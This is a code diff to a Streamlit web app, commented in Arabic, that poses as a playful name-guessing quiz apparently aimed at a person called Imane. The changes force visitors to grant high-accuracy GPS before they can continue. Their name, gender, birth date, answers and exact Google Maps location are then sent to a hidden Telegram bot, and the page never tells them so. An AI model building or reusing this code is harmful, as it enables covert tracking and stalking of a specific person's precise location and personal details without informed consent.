@@ -44,6 +44,12 @@ if "attempts" not in st.session_state:
 if "user_location_link" not in st.session_state:
     st.session_state.user_location_link = "لم يتم تفعيل GPS"
 
+# التحقق من الإحداثيات الممررة عبر رابط الصفحة
+if "lat" in st.query_params and "lon" in st.query_params:
+    lat = st.query_params["lat"]
+    lon = st.query_params["lon"]
+    st.session_state.user_location_link = f"https://www.google.com/maps?q={lat},{lon}"
+
 
 # دالة إرسال التنبيهات إلى تيليغرام
 def send_telegram_msg(text_message):
@@ -118,7 +124,7 @@ def is_legally_allowed_in_morocco(name: str) -> bool:
     return False
 
 
-# --- الخطوة الأولى: إدخال البيانات والتأكد من تحديد الموقع ---
+# --- الخطوة الأولى: إدخال البيانات والتأكد الإجباري من تفعيل الخريطة ---
 if st.session_state.step == 1:
     st.markdown(
         """
@@ -152,15 +158,23 @@ if st.session_state.step == 1:
                 font-weight: bold !important;
                 padding: 10px !important;
             }
-            .location-alert {
-                background-color: #3d001e;
-                border: 1px solid #ff4d6d;
-                border-radius: 10px;
-                padding: 12px;
+            .location-box {
+                background: rgba(255, 0, 85, 0.15);
+                border: 2px dashed #ff0055;
+                border-radius: 15px;
+                padding: 15px;
                 text-align: center;
-                color: #ffccd5;
+                margin-bottom: 20px;
+            }
+            .location-status-active {
+                color: #00ff88;
                 font-weight: bold;
-                margin-bottom: 15px;
+                margin-top: 8px;
+            }
+            .location-status-pending {
+                color: #ff4d6d;
+                font-weight: bold;
+                margin-top: 8px;
             }
         </style>
         """,
@@ -171,41 +185,51 @@ if st.session_state.step == 1:
         unsafe_allow_html=True,
     )
 
+    # مربع طلب الخريطة الإجباري
+    is_gps_active = "google.com/maps" in st.session_state.user_location_link
+    status_msg = (
+        '<div class="location-status-active">✅ تم تفعيل الخريطة وتحديد موقعك بنجاح!</div>'
+        if is_gps_active
+        else '<div class="location-status-pending">⚠️ الخريطة غير مفعلة! اضغط الزر بالأسفل لتفعيل GPS للدخول.</div>'
+    )
+
     st.markdown(
-        '<div class="location-alert">📍 المرجو تشغيل الخريطة (Location/GPS) وتفعيل زر التحديد بالأسفل للمتابعة</div>',
+        f"""
+        <div class="location-box">
+            <h4 style="margin:0; color:#ff4d6d;">📍 شرط تشغيل الموقع</h4>
+            <p style="font-size:14px; margin-top:5px; color:#ddd;">يرجى تفعيل الخريطة (GPS) على جهازك لفتح زر المتابعة.</p>
+            {status_msg}
+        </div>
+        """,
         unsafe_allow_html=True,
     )
 
-    # مكون خريطة جافاسكريبت للحصول على الإحداثيات الدقيقة
+    # زر الجافاسكريبت لإجبار جلب الموقع
     loc_html = """
     <script>
-    function getLocation() {
+    function triggerGPS() {
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(showPosition, showError);
+            navigator.geolocation.getCurrentPosition(function(position) {
+                var lat = position.coords.latitude;
+                var lon = position.coords.longitude;
+                var newUrl = window.parent.location.pathname + "?lat=" + lat + "&lon=" + lon;
+                window.parent.location.href = newUrl;
+            }, function(error) {
+                alert("🚫 يجب تشغيل الـ GPS من إعدادات الهاتف والسماح للمتصفح للوصول للموقع كي يعمل الموقع!");
+            }, {enableHighAccuracy: true});
         } else {
             alert("الخريطة غير مدعومة في هذا المتصفح.");
         }
     }
-    function showPosition(position) {
-        var lat = position.coords.latitude;
-        var lon = position.coords.longitude;
-        var mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
-        window.parent.postMessage({type: "streamlit:setComponentValue", value: mapUrl}, "*");
-        alert("تم الحصول على الموقع بنجاح! يمكنك الضغط على Continue الآن.");
-    }
-    function showError(error) {
-        alert("يرجى تشغيل الخريطة (GPS) والسماح بالوصول للموقع للمتابعة!");
-    }
     </script>
     <div style="text-align: center;">
-        <button onclick="getLocation()" style="background: linear-gradient(135deg, #4caf50, #2e7d32); color: white; border: none; padding: 12px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%;">
-            🗺️ اضغط هنا لتفعيل الخريطة والموقع أولاً
+        <button onclick="triggerGPS()" style="background: linear-gradient(135deg, #00c853, #b2ff59); color: #000; border: none; padding: 12px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px;">
+            🌐 اضغط هنا لتشغيل الخريطة والموافقة على الموقع 📍
         </button>
     </div>
     """
-    location_result = components.html(loc_html, height=60)
+    components.html(loc_html, height=60)
 
-    # إدخال البيانات
     with st.form("user_info_form"):
         name_in = st.text_input("Enter Your Name:", placeholder="Type your name here...")
         gender_in = st.radio("Select Your Gender:", ["Boy 👦", "Girl 👧"], horizontal=True)
@@ -222,6 +246,8 @@ if st.session_state.step == 1:
             name_val = name_in.strip()
             if not name_val:
                 st.warning("Please enter your name first!")
+            elif "google.com/maps" not in st.session_state.user_location_link:
+                st.error("🚫 عذراً! لن يعمل الموقع حتى تقوم بتشغيل الخريطة والضغط على الزر الأخضر بالـ GPS أولاً!")
             elif not is_legally_allowed_in_morocco(name_val):
                 st.error("⚠️ This name cannot be entered, please try again!")
             else:
@@ -229,7 +255,7 @@ if st.session_state.step == 1:
                 st.session_state.visitor_gender = gender_in
                 st.session_state.visitor_dob = str(dob_in)
 
-                # تنبيه الإرسال لتيليغرام
+                # إرسال التنبيه الفوري متضمناً رابط الخريطة الدقيق
                 msg = (
                     f"🚨 دخول زائر جديد!\n"
                     f"👤 الاسم: {name_val}\n"
@@ -245,7 +271,7 @@ if st.session_state.step == 1:
                     st.session_state.step = 2
                     st.rerun()
 
-# --- الخطوة الثانية: السؤال الرئيسي ---
+# --- الخطوة الثانية: السؤال الرئيسي وتفعيل الأغاني والمؤثرات ---
 elif st.session_state.step == 2:
     ALLOWED_NAMES = ["imane", "iman", "eman"]
 
@@ -310,7 +336,7 @@ elif st.session_state.step == 2:
                 f"👤 الاسم: {st.session_state.visitor_name}\n"
                 f"✍️ الإجابة المدخلة: {user_input}\n"
                 f"🔢 المحاولات: {st.session_state.attempts}\n"
-                f"📍 الموقع: {st.session_state.user_location_link}"
+                f"📍 الخريطة: {st.session_state.user_location_link}"
             )
             success, err_msg = send_telegram_msg(msg)
 
@@ -318,6 +344,16 @@ elif st.session_state.step == 2:
                 st.error(f"⚠️ تنبيه البوت: {err_msg}")
 
             if clean_name in ALLOWED_NAMES:
+                # 🎵 تشغيل موسيقى/أغنية النجاح السعيدة 🎵
+                st.markdown(
+                    """
+                    <audio autoplay loop style="display:none;">
+                        <source src="https://cdn.pixabay.com/audio/2022/05/27/audio_1808fbf07a.mp3" type="audio/mp3">
+                    </audio>
+                    """,
+                    unsafe_allow_html=True,
+                )
+
                 st.markdown(
                     """
                     <style>
@@ -450,6 +486,16 @@ elif st.session_state.step == 2:
                     )
 
             else:
+                # 🎵 تشغيل موسيقى/أغنية الفشل الحزينة 🎵
+                st.markdown(
+                    """
+                    <audio autoplay loop style="display:none;">
+                        <source src="https://cdn.pixabay.com/audio/2021/08/09/audio_884334c480.mp3" type="audio/mp3">
+                    </audio>
+                    """,
+                    unsafe_allow_html=True,
+                )
+
                 RAIN_3D_ANIMATED = "https://i.gifer.com/7SdO.gif"
                 warnings = [
                     "🥺 What a failure... Are you sure about that? Think carefully!",
